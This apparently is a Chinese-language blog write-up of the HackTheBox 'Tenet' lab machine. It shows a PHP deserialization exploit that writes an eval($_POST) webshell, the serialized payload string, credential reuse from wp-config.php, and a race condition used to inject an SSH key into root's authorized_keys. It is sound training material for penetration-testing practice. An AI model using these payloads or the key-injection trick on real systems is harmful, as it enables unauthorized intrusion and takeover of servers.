---
layout:     post
title:      HackTheBox Tenet
subtitle:   HackTheBox
date:       2021-04-27
author:     heria
header-img: img/post-bg-013.jpg
catalog: true
tags:
---

## 信息收集

nmap

![image-20210426092930958](https://raw.githubusercontent.com/heriachen/cloudimg/main/img2/image-20210426092930958.png)

访问80页面

![image-20210426093424485](https://raw.githubusercontent.com/heriachen/cloudimg/main/img2/image-20210426093424485.png)

使用gobuster进一步扫描

（Gobuster是一个扫描仪，寻找现有的或隐藏的Web对象。它通过对Web服务器发起字典攻击并分析）

kali下默认未下载，执行apt-get install gobuster

![image-20210426173029375](https://raw.githubusercontent.com/heriachen/cloudimg/main/img2/image-20210426173029375.png)



期间跟靶机连接断了很多次，重启一下vpn，好在最后跑出来了

![image-20210426175119639](https://raw.githubusercontent.com/heriachen/cloudimg/main/img2/image-20210426175119639.png)

## 渗透

/etc/hosts中添加

```
10.10.10.223   tenet.htb
```

访问站点，找到如下提示信息

![image-20210426175929035](https://raw.githubusercontent.com/heriachen/cloudimg/main/img2/image-20210426175929035.png)

提示有个sator.php和备份文件

http://tenet.htb/sator.php和http://tenet.htb/sator.php.bak均访问失败。

直接访问10.10.10.223/sator.php

![image-20210427093329631](https://raw.githubusercontent.com/heriachen/cloudimg/main/img2/image-20210427093329631.png)

访问10.10.10.223/sator.php.bak下载备份文件之后cat查看

![image-20210427093501787](https://raw.githubusercontent.com/heriachen/cloudimg/main/img2/image-20210427093501787.png)

获取到的源码

```
<?php

class DatabaseExport
{
        public $user_file = 'users.txt';
        public $data = '';

        public function update_db()
        {
                echo '[+] Grabbing users from text file <br>';
                $this-> data = 'Success';
        }


        public function __destruct()
        {
                file_put_contents(__DIR__ . '/' . $this ->user_file, $this->data);
                echo '[] Database updated <br>';
        //      echo 'Gotta get this working properly...';
        }
}

$input = $_GET['arepo'] ?? '';
$databaseupdate = unserialize($input);

$app = new DatabaseExport;
$app -> update_db();


?>
```

需要利用到php反序列化漏洞

这边找到一篇关于php反序列化漏洞的技术贴，放到文末的参考链接中以供学习。

可以利用destruct函数写入webshell

```php
<?php

class DatabaseExport
{
        public $user_file = 'users.txt';
        public $data = '';

        public function update_db()
        {
                echo '[+] Grabbing users from text file <br>';
                $this-> data = 'Success';
        }


        public function __destruct()
        {
                file_put_contents(__DIR__ . '/' . $this ->user_file, $this->data);
                echo '[] Database updated <br>';
        //      echo 'Gotta get this working properly...';
        }
}



$app = new DatabaseExport;

$app -> user_file = 'shell.php';
$app -> data = '<?php eval($_POST[a]);?>';
echo serialize($app);

?>
```

生成如下序列化数据

![image-20210427115131362](https://raw.githubusercontent.com/heriachen/cloudimg/main/img2/image-20210427115131362.png)

```
O:14:"DatabaseExport":2:{s:9:"user_file";s:9:"shell.php";s:4:"data";s:24:"<?php eval($_POST[a]);?>";}
```

提交请求

![image-20210427130348555](https://raw.githubusercontent.com/heriachen/cloudimg/main/img2/image-20210427130348555.png)

访问shell.php

![image-20210427130429639](https://raw.githubusercontent.com/heriachen/cloudimg/main/img2/image-20210427130429639.png)

应该已经解析了，中国蚁剑成功链接，kali下需要自行安装，文末给出参考链接

![image-20210427130613644](https://raw.githubusercontent.com/heriachen/cloudimg/main/img2/image-20210427130613644.png)

当前为www-data用户，users.txt内容为success

![image-20210427130810188](https://raw.githubusercontent.com/heriachen/cloudimg/main/img2/image-20210427130810188.png)

在wordpress的wp-config.php中获取mysql连接密码

![image-20210427131013068](https://raw.githubusercontent.com/heriachen/cloudimg/main/img2/image-20210427131013068.png)

## 提权

尝试密码复用，成功登录到neil用户

![image-20210427131357292](https://raw.githubusercontent.com/heriachen/cloudimg/main/img2/image-20210427131357292.png)

```
ssh neil@10.10.10.223
```

成功登录,获取user权限，查看到user.txt内容

![image-20210427132956101](https://raw.githubusercontent.com/heriachen/cloudimg/main/img2/image-20210427132956101.png)

发现可以sudo运行enablessh.sh文件

![image-20210427133721261](https://raw.githubusercontent.com/heriachen/cloudimg/main/img2/image-20210427133721261.png)



```
#!/bin/bash

checkAdded() {

        sshName=$(/bin/echo $key | /usr/bin/cut -d " " -f 3)

        if [[ ! -z $(/bin/grep $sshName /root/.ssh/authorized_keys) ]]; then

                /bin/echo "Successfully added $sshName to authorized_keys file!"

        else

                /bin/echo "Error in adding $sshName to authorized_keys file!"

        fi

}

checkFile() {

        if [[ ! -s $1 ]] || [[ ! -f $1 ]]; then

                /bin/echo "Error in creating key file!"

                if [[ -f $1 ]]; then /bin/rm $1; fi

                exit 1

        fi

}

addKey() {

        tmpName=$(mktemp -u /tmp/ssh-XXXXXXXX)

        (umask 110; touch $tmpName)

        /bin/echo $key >>$tmpName

        checkFile $tmpName

        /bin/cat $tmpName >>/root/.ssh/authorized_keys

        /bin/rm $tmpName

}

key="ssh-rsa AAAAA3NzaG1yc2GAAAAGAQAAAAAAAQG+AMU8OGdqbaPP/Ls7bXOa9jNlNzNOgXiQh6ih2WOhVgGjqr2449ZtsGvSruYibxN+MQLG59VkuLNU4NNiadGry0wT7zpALGg2Gl3A0bQnN13YkL3AA8TlU/ypAuocPVZWOVmNjGlftZG9AP656hL+c9RfqvNLVcvvQvhNNbAvzaGR2XOVOVfxt+AmVLGTlSqgRXi6/NyqdzG5Nkn9L/GZGa9hcwM8+4nT43N6N31lNhx4NeGabNx33b25lqermjA+RGWMvGN8siaGskvgaSbuzaMGV9N8umLp6lNo5fqSpiGN8MQSNsXa3xXG+kplLn2W+pbzbgwTNN/w0p+Urjbl root@ubuntu"
addKey
checkAdded
```

这个脚本会先把公钥写入临时文件，之后checkfile检查，再把临时文件中的内容写进root目录
这里创建临时文件并将公钥写入 到读取临时文件里的公钥写入authorized_keys中间有一系列if判断，存在时间差，导致条件竞争

用户可以在把公钥写入临时文件->临时文件写入root目录这个过程中，任意修改临时文件中的内容，以达到把自己想要的内容写入`/root/.ssh/authorized_keys`的目的



本地生成密钥对

```
ssh-keygen
cat /root/.ssh/id_rsa.pub
```

![image-20210427134650643](https://raw.githubusercontent.com/heriachen/cloudimg/main/img2/image-20210427134650643.png)

将自己的公钥写入目标机器

```
echo "公钥" > /home/neil/key
```

![image-20210427140331889](https://raw.githubusercontent.com/heriachen/cloudimg/main/img2/image-20210427140331889.png)

之后建立两个ssh的连接，第一个中执行下图左侧指令，第二个执行右侧指令

![image-20210427140626647](https://raw.githubusercontent.com/heriachen/cloudimg/main/img2/image-20210427140626647.png)

稍等一段时间提示success...

![image-20210427140750517](https://raw.githubusercontent.com/heriachen/cloudimg/main/img2/image-20210427140750517.png)

ssh使用密钥对登录root成功，获取到root.txt

![image-20210427140854678](https://raw.githubusercontent.com/heriachen/cloudimg/main/img2/image-20210427140854678.png)



## 参考链接

php反序列化技术贴：

```
https://www.k0rz3n.com/2018/11/19/%E4%B8%80%E7%AF%87%E6%96%87%E7%AB%A0%E5%B8%A6%E4%BD%A0%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/
```

kali下安装中国蚁剑：

```
https://www.cnblogs.com/Zhu013/p/11870300.html

https://github.com/AntSwordProject/
```

linux安装php:

```
https://segmentfault.com/a/1190000021205039
```

